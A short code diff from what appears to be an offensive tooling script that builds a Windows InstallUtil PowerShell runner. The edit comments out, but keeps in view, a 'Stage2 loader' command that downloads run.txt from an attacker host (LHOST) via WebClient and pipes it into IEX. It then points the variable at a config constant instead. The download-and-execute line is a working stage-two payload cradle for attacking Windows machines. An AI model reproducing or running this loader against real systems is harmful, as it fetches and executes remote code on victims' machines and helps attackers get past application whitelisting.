@@ -6,7 +6,8 @@ BASE_FILENAME = 'win_installutil_ps_runner'
 FN_CS = BASE_FILENAME + ".cs"
 
 # Stage2 loader:
-PS_CMD = f"(New-Object System.Net.WebClient).DownloadString('http://{ak.LHOST}/run.txt') | IEX"
+#PS_CMD = f"(New-Object System.Net.WebClient).DownloadString('http://{ak.LHOST}/run.txt') | IEX"
+PS_CMD = ak.PS_RUNTXT_CMD
 
 def generate():
 
